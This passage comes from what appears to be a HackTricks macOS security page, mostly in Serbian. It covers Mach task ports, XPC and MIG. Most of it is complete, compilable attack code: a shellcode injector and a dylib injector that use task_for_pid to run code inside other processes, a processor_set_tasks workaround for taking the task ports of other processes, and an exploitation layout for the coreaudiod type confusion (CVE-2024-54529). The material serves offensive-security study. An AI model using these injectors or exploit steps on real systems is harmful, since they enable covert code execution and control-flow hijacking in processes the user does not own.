double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Kompajlirajte** prethodni program i dodajte **entitlements** da biste mogli da injektujete kod pod istim korisnikom (u suprotnom ćete morati da koristite **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Za ovo da radi na iOS-u potrebno je entitlement `dynamic-codesigning` kako bi writable memorija mogla postati executable.

### Dylib Injection in thread via Task port

Na macOS-u **threads** se mogu manipulisati preko **Mach** ili koristeći **posix `pthread` api`**. Nit koju smo generisali u prethodnoj injekciji napravljena je korišćenjem Mach api-ja, tako da **nije posix kompatibilna**.

Bilo je moguće **inject a simple shellcode** da izvrši komandu jer **nije bilo potrebno raditi sa posix** kompatibilnim API-jem, već samo sa Mach. **More complex injections** zahtevale bi da **thread** bude takođe **posix compliant**.

Stoga, da bi se **improve the thread**, treba pozvati **`pthread_create_from_mach_thread`** koji će **create a valid pthread**. Onda bi ovaj novi pthread mogao **call dlopen** da **load a dylib** iz sistema, tako da umesto pisanja novog shellcode-a za različite radnje moguće je učitati custom biblioteke.

You can find **example dylibs** in (for example the one that generates a log and then you can listen to it):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

U ovoj tehnici se hijack-uje nit procesa:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Otkrivanje injekcije Task porta

Kada se pozovu `task_for_pid` ili `thread_create_*`, povećava se brojač u strukturi task u kernelu koji se može pristupiti iz korisničkog režima pozivanjem task_info(task, TASK_EXTMOD_INFO, ...)

## Portovi izuzetaka

Kada se dogodi izuzetak u niti, taj izuzetak se šalje na dodeljeni exception port te niti. Ako ga nit ne obradi, onda se šalje na task exception portove. Ako task ne obradi izuzetak, on se onda šalje na host port kojim upravlja launchd (gde će biti potvrđen). Ovo se naziva exception triage.

Imajte na umu da će, ako se ne obradi pravilno, izveštaj obično završiti kod demona ReportCrash. Međutim, moguće je da druga nit u istom tasku obradi izuzetak — to je ono što alati za prijavu crash-a kao što je `PLCreashReporter` rade.

## Ostali objekti

### Sat

Bilo koji korisnik može pristupiti informacijama o satu, međutim da bi podesio vreme ili izmenio druga podešavanja mora biti root.

Da biste dobili informacije, moguće je pozvati funkcije iz `clock` subsistema kao što su: `clock_get_time`, `clock_get_attributtes` ili `clock_alarm`\
Za izmenu vrednosti može se koristiti `clock_priv` subsistem sa funkcijama kao što su `clock_set_time` i `clock_set_attributes`

### Procesori i processor set

Processor API-ji omogućavaju kontrolu pojedinačnog logičkog procesora pozivanjem funkcija kao što su `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Pored toga, **processor set** API-ji omogućavaju grupisanje više procesora u set. Moguće je dobiti podrazumevani processor set pozivanjem **`processor_set_default`**.\
Ovo su neke interesantne API funkcije za interakciju sa processor set-om:

- `processor_set_statistics`
- `processor_set_tasks`: Return an array of send rights to all tasks inside the processor set
- `processor_set_threads`: Return an array of send rights to all threads inside the processor set
- `processor_set_stack_usage`
- `processor_set_info`

Kao što je pomenuto u [**this post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), nekada je ovo omogućavalo zaobilaženje prethodno pomenute zaštite da bi se dobili task portovi u drugim procesima i kontrolisali ih pozivom **`processor_set_tasks`** i dobijanjem host porta u svakom procesu.\
Danas vam treba root da biste koristili tu funkciju i ona je zaštićena, tako da ćete moći da dobijete te portove samo na nezaštićenim procesima.

Možete to isprobati sa:

<details>

<summary><strong>processor_set_tasks kod</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; indirect call through vtable slot
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
{{#include ../../../../banners/hacktricks-training.md}}
